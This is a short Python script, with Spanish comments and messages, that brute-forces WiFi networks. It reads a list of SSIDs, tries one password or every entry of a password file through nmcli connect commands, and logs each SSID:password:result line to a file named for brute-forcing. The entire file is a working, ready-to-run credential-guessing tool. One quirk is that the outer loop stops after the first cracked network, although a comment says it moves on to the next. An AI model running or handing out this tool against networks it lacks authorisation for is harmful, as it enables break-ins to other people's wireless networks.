import subprocess
import argparse

def conectar_wifi(ssid, password):
    comando = ["nmcli", "dev", "wifi", "connect", ssid, "password", password]
    resultado = subprocess.run(comando, capture_output=True, text=True)
    if resultado.returncode == 0:
        return '[+] Conexión exitosa!!'
    else:
        return '[-] ~~~~~ Conexión fallida'

def verificar_conexiones(archivo_ssid, password, archivo_pass):
    resultados = []
    with open(archivo_ssid, 'r') as f_ssid:
        if password:  # Si se proporciona una contraseña directamente
            for linea_ssid in f_ssid:
                ssid = linea_ssid.strip()
                resultado = conectar_wifi(ssid, password)
                resultados.append(f"{ssid}:{password}:{resultado}\n")
        elif archivo_pass:  # Si se proporciona un archivo de contraseñas
            with open(archivo_pass, 'r') as f_passwords:
                for linea_ssid in f_ssid:
                    password_encontrada = False
                    ssid = linea_ssid.strip()
                    f_passwords.seek(0)  # Colocar el cursor del archivo de contraseñas al principio
                    for linea_password in f_passwords:
                        password = linea_password.strip()
                        resultado = conectar_wifi(ssid, password)
                        resultados.append(f"{ssid}:{password}:{resultado}\n")
                        if "Conexión exitosa" in resultado:  # Si se encontró una contraseña válida, marcar la bandera y salir del bucle interno
                            password_encontrada = True
                            break
                    if password_encontrada:  # Si se encontró una contraseña válida, pasar al siguiente SSID
                        break
    with open('output_bruteforce_SSIDs.txt', 'w') as f:
        f.writelines(resultados)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Verificar conexiones WiFi')
    parser.add_argument('archivo_ssid', help='Archivo de entrada con los SSID de las redes WiFi')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-p', '--password', help='Contraseña para las redes WiFi')
    group.add_argument('-P', '--passFile', help='Archivo de contraseñas para las redes WiFi')
    args = parser.parse_args()

    verificar_conexiones(args.archivo_ssid, args.password, args.passFile)